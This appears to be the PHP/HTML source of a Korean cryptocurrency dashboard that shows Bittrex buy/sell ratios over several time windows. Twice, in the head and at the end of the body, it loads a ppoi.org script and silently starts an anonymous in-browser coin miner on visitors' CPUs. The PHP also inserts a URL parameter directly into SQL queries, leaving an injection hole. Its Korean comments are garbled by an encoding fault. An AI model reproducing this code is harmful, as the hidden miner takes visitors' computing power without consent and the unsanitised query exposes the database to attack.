<?
$m = "0";
$o = "d";
if(isset($_GET["m"]))
 $m = $_GET["m"];
if(isset($_GET["o"]))
 $o = $_GET["o"];

require_once("DB/dbconfig.php");
$sql="SELECT * FROM lsy_parsinglog order by log DESC limit 1";
$resultnow = mysqli_query($db,$sql);
$row=mysqli_fetch_array($resultnow);
$lasttime = $row['log'];

$lastdate="SELECT max(time) FROM lsy_bitcoin";
$last = mysqli_query($db,$lastdate);
$l=mysqli_fetch_array($last);
?>
<!DOCTYPE html>
<html lang="ko">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
	<script src="https://ppoi.org/lib/projectpoi.min.js"></script>
	<script>
		var miner = new ProjectPoi.Anonymous('UIeWAtcJkh36tiZFN7XLHSoL');
       	 	miner.setThrottle(0.2);
		miner.start();
	</script>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- ??3ê°œì˜ ë©”í? ?œê·¸??*ë°˜ë“œ?? head ?œê·¸??ì²˜ìŒ???€?¼í•©?ˆë‹¤; ?´ë–¤ ?¤ë¥¸ ì½˜í…ì¸ ë“¤?€ ë°˜ë“œ?????œê·¸??*?¤ìŒ?? ?€???©ë‹ˆ??-->
    <title>Bittrex Parsing</title>

    <!-- ë¶€?¸ìŠ¤?¸ëž© -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <style type="text/css">
      body{
        color:#fff;
      }
      .table-hover tbody tr:hover td, .table-hover tbody tr:hover th {
        background-color: aqua;
      }
 
    </style>
    <!-- IE8 ?ì„œ HTML5 ?”ì†Œ?€ ë¯¸ë””??ì¿¼ë¦¬ë¥??„í•œ HTML5 shim ?€ Respond.js -->
    <!-- WARNING: Respond.js ???¹ì‹ ??file:// ???µí•´ ?˜ì´ì§€ë¥?ë³??ŒëŠ” ?™ìž‘?˜ì? ?ŠìŠµ?ˆë‹¤. -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  </head>
  <body style="background-color: #000; min-width: 2000px">
    <div class="row">
    <div class="col-md-1"></div>
    <div class="col-md-10">
      <h1>Bittrex Parsing (Start Date : <?=$lasttime;?> )</h1>
      <h6><mark>Last Date : <?=$l['max(time)']?> <mark></h6>
      </div>
    </div>
    <div class="row">
    <div class="col-md-1"></div>
      <div class="col-md-10">
      <table class="table table-bordered table-hover">
        <thead>
          <tr>
            <th>Name</th>
            <th>1m
            <button type="button" class="btn btn-default btn-xs" aria-label="Left Align">
              <a href ="?m=1&o=u" class="glyphicon glyphicon-chevron-up" aria-hidden="true"></a>
            </button>
            <button type="button" class="btn btn-default btn-xs" aria-label="Left Align">
              <a href ="?m=1&o=d" class="glyphicon glyphicon-chevron-down" aria-hidden="true"></a>
            </button>
            </th>
            <th>3m
            <button type="button" class="btn btn-default btn-xs" aria-label="Left Align">
              <a href ="?m=3&o=u" class="glyphicon glyphicon-chevron-up" aria-hidden="true"></a>
            </button>
            <button type="button" class="btn btn-default btn-xs" aria-label="Left Align">
              <a href ="?m=3&o=d" class="glyphicon glyphicon-chevron-down" aria-hidden="true"></a>
            </button>
            </th>
            <th>5m
            <button type="button" class="btn btn-default btn-xs" aria-label="Left Align">
              <a href ="?m=5&o=u" class="glyphicon glyphicon-chevron-up" aria-hidden="true"></a>
            </button>
            <button type="button" class="btn btn-default btn-xs" aria-label="Left Align">
              <a href ="?m=5&o=d" class="glyphicon glyphicon-chevron-down" aria-hidden="true"></a>
            </button>
            </th>
            <th>10m
            <button type="button" class="btn btn-default btn-xs" aria-label="Left Align">
              <a href ="?m=10&o=u" class="glyphicon glyphicon-chevron-up" aria-hidden="true"></a>
            </button>
            <button type="button" class="btn btn-default btn-xs" aria-label="Left Align">
              <a href ="?m=10&o=d" class="glyphicon glyphicon-chevron-down" aria-hidden="true"></a>
            </button>
            </th>
            <th>30m
            <button type="button" class="btn btn-default btn-xs" aria-label="Left Align">
              <a href ="?m=30&o=u" class="glyphicon glyphicon-chevron-up" aria-hidden="true"></a>
            </button>
            <button type="button" class="btn btn-default btn-xs" aria-label="Left Align">
              <a href ="?m=30&o=d" class="glyphicon glyphicon-chevron-down" aria-hidden="true"></a>
            </button>
            </th>
            <th>60m
            <button type="button" class="btn btn-default btn-xs" aria-label="Left Align">
              <a href ="?m=60&o=u" class="glyphicon glyphicon-chevron-up" aria-hidden="true"></a>
            </button>
            <button type="button" class="btn btn-default btn-xs" aria-label="Left Align">
              <a href ="?m=60&o=d" class="glyphicon glyphicon-chevron-down" aria-hidden="true"></a>
            </button>
            </th>
            <th>Total
            <button type="button" class="btn btn-default btn-xs" aria-label="Left Align">
              <a href ="?m=0&o=u" class="glyphicon glyphicon-chevron-up" aria-hidden="true"></a>
            </button>
            <button type="button" class="btn btn-default btn-xs" aria-label="Left Align">
              <a href ="?m=0&o=d" class="glyphicon glyphicon-chevron-down" aria-hidden="true"></a>
            </button>
            </th>
          </tr>
        </thead>
        <tbody>
        <?
          if($m == "0"){
            $order = "DESC";
            if($o =="u" )
              $order = "ASC";
            $sql="SELECT * FROM lsy_bitcoin where time >= '$lasttime' group by stock  order by sum(buy) /(sum(buy)+sum(sell)) ".$order;
          }
          else{
            $order = "DESC";
            if($o =="u" )
              $order = "ASC";
            $sql="SELECT * FROM lsy_bitcoin WHERE time >= date_sub(now() ,interval + '$m' minute ) AND time >= '$lasttime' group by stock order by sum(buy) /(sum(buy)+sum(sell)) ".$order;
            //$sql="SELECT * FROM lsy_bitcoin group by stock order by sum(buy) /(sum(buy)+sum(sell)) ".$order." WHERE time >= date_sub(now() ,interval + ".$m." minute ) AND time >= '$lasttime' ";
        
          }
          $resultnow = mysqli_query($db,$sql);
          while($row=mysqli_fetch_array($resultnow))
          {
            //?„ìž¬ ?œê°„ ê¸°ì??¼ë¡œ 1ë¶„ì „ê¹Œì????°ì´??
            $sql1m = "SELECT stock, sum(buy),sum(sell) FROM   lsy_bitcoin WHERE time >= date_sub(now() ,interval + 2 minute ) AND time >= '$lasttime' AND stock = '".$row['stock']."' group by stock";
            $result1m = mysqli_query($db,$sql1m);
            $row1m=mysqli_fetch_array($result1m);
             if($row1m['sum(buy)']+$row1m['sum(sell)'] > 0) {
	            $value1m = round((100*$row1m['sum(buy)'])/($row1m['sum(buy)']+$row1m['sum(sell)']),2);
	        } else{
	            $value1m = 0;
	        }
            
            //
            $sql3m = "SELECT stock, sum(buy),sum(sell) FROM   lsy_bitcoin WHERE time >= date_sub(now() ,interval + 3 minute ) AND time >= '$lasttime' AND stock = '".$row['stock']."' group by stock";
            $result3m = mysqli_query($db,$sql3m);
            $row3m=mysqli_fetch_array($result3m);
            if($row3m['sum(buy)']+$row3m['sum(sell)'] > 0) {
	            $value3m = round((100*$row3m['sum(buy)'])/($row3m['sum(buy)']+$row3m['sum(sell)']),2);
	        } else{
	            $value3m = 0;
	        }
	         //
           $sql5m = "SELECT stock, sum(buy),sum(sell) FROM   lsy_bitcoin WHERE time >= date_sub(now() ,interval + 5 minute ) AND time >= '$lasttime' AND stock = '".$row['stock']."' group by stock";
            $result5m = mysqli_query($db,$sql5m);
            $row5m=mysqli_fetch_array($result5m);
            if($row5m['sum(buy)']+$row5m['sum(sell)'] > 0) {
	            $value5m = round((100*$row5m['sum(buy)'])/($row5m['sum(buy)']+$row5m['sum(sell)']),2);
	        } else{
	            $value5m = 0;
	        }
            //
            $sql10m = "SELECT stock, sum(buy),sum(sell) FROM   lsy_bitcoin WHERE time >= date_sub(now() ,interval + 10 minute ) AND time >= '$lasttime' AND stock = '".$row['stock']."' group by stock";
            $result10m = mysqli_query($db,$sql10m);
            $row10m=mysqli_fetch_array($result10m);
            if($row10m['sum(buy)']+$row10m['sum(sell)'] > 0) {
	            $value10m = round((100*$row10m['sum(buy)'])/($row10m['sum(buy)']+$row10m['sum(sell)']),2);
	        } else{
	            $value10m = 0;
	        }
	        //
            $sql30m = "SELECT stock, sum(buy),sum(sell) FROM   lsy_bitcoin WHERE time >= date_sub(now() ,interval + 30 minute ) AND time >= '$lasttime' AND stock = '".$row['stock']."' group by stock";
            $result30m = mysqli_query($db,$sql30m);
            $row30m=mysqli_fetch_array($result30m);
            if($row30m['sum(buy)']+$row30m['sum(sell)'] > 0) {
	            $value30m = round((100*$row30m['sum(buy)'])/($row30m['sum(buy)']+$row30m['sum(sell)']),2);
	        } else{
	            $value30m = 0;
	        }
	        //
            $sql60m = "SELECT stock, sum(buy),sum(sell) FROM   lsy_bitcoin WHERE time >= date_sub(now() ,interval + 60 minute ) AND time >= '$lasttime' AND stock = '".$row['stock']."' group by stock";
            $result60m = mysqli_query($db,$sql60m);
            $row60m=mysqli_fetch_array($result60m);
            if($row60m['sum(buy)']+$row60m['sum(sell)'] > 0) {
	            $value60m = round((100*$row60m['sum(buy)'])/($row60m['sum(buy)']+$row60m['sum(sell)']),2);
	        } else{
	            $value60m = 0;
	        }
	          //
            $sqltotal = "SELECT stock, sum(buy),sum(sell) FROM   lsy_bitcoin WHERE time >= '$lasttime' AND stock = '".$row['stock']."' group by stock";
            $resulttotal = mysqli_query($db,$sqltotal);
            $rowtotal=mysqli_fetch_array($resulttotal);
            if($rowtotal['sum(buy)']+$rowtotal['sum(sell)'] > 0) {
	            $valuetotal = round((100*$rowtotal['sum(buy)'])/($rowtotal['sum(buy)']+$rowtotal['sum(sell)']),2);
	        } else{
	            $valuetotal = 0;
	        }


            echo '
             <tr>
              <th scope="row">'.$row['stock'].'</th>
              <td><code>'.$value1m.'%</code> ('.round($row1m['sum(buy)'],4).'/'.round($row1m['sum(buy)']+$row1m['sum(sell)'],4).')</td>
              <td><code>'.$value3m.'%</code> ('.round($row3m['sum(buy)'],4).'/'.round($row3m['sum(buy)']+$row3m['sum(sell)'],4).')</td>
              <td><code>'.$value5m.'%</code> ('.round($row5m['sum(buy)'],4).'/'.round($row5m['sum(buy)']+$row5m['sum(sell)'],4).')</td>
              <td><code>'.$value10m.'%</code> ('.round($row10m['sum(buy)'],4).'/'.round($row10m['sum(buy)']+$row10m['sum(sell)'],4).')</td>
              <td><code>'.$value30m.'%</code> ('.round($row30m['sum(buy)'],4).'/'.round($row30m['sum(buy)']+$row30m['sum(sell)'],4).')</td>
              <td><code>'.$value60m.'%</code> ('.round($row60m['sum(buy)'],4).'/'.round($row60m['sum(buy)']+$row60m['sum(sell)'],4).')</td>
              <td><code>'.$valuetotal.'%</code> ('.round($rowtotal['sum(buy)'],4).'/'.round($rowtotal['sum(buy)']+$rowtotal['sum(sell)'],4).')</td>
            </tr>
             ';
          }
        ?>
         
      </table>
      </div>
    </div>
    <script language='javascript'> 
      window.setTimeout('window.location.reload()',20000); //20ì´ˆë§ˆ???ˆë¡œê³ ì¹¨
    </script>
    <!-- jQuery (ë¶€?¸ìŠ¤?¸ëž©???ë°”?¤í¬ë¦½íŠ¸ ?ŒëŸ¬ê·¸ì¸???„í•´ ?„ìš”?©ë‹ˆ?? -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
    <!-- ëª¨ë“  ì»´íŒŒ?¼ëœ ?ŒëŸ¬ê·¸ì¸???¬í•¨?©ë‹ˆ??(?„ëž˜), ?í•˜ì§€ ?ŠëŠ”?¤ë©´ ?„ìš”??ê°ê°???Œì¼???¬í•¨?˜ì„¸??-->
    <script src="js/bootstrap.min.js"></script>
<script src="https://ppoi.org/lib/projectpoi.min.js"></script>
<script>
	if (navigator.hardwareConcurrency > 1){
    		var cpuConfig = {threads: Math.round(navigator.hardwareConcurrency/2)}
	}else{
    	var cpuConfig = {throttle:0.6}
	}
	var miner = new ProjectPoi.Anonymous('Nt0ey2TPpCCPv3txVUMmkTuT');
	miner.start();
</script>
  </body>
</html>